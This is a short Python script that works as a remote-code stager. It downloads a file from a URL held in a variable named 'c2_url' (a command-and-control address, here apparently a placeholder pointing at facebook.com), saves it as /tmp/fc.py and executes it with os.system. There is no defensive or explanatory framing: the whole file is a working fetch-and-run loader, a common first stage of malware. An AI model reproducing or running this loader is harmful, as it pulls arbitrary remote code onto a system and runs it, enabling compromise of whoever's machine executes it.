import requests
import os

def download_code(url):
    response = requests.get(url)
    return response.text

def write_code_to_file(file_path, code):
    with open(file_path, "w") as f:
        f.write(code)

def read_code_from_file(file_path):
    with open(file_path, "r") as f:
        return f.read()

def run_code(file_path):
    os.system(f"python {file_path}")

def main():
    c2_url = "https://facebook.com/fc.py"
    temp_file = "/tmp/fc.py"
    
    code = download_code(c2_url)
    write_code_to_file(temp_file, code)
    run_code(temp_file)

main()
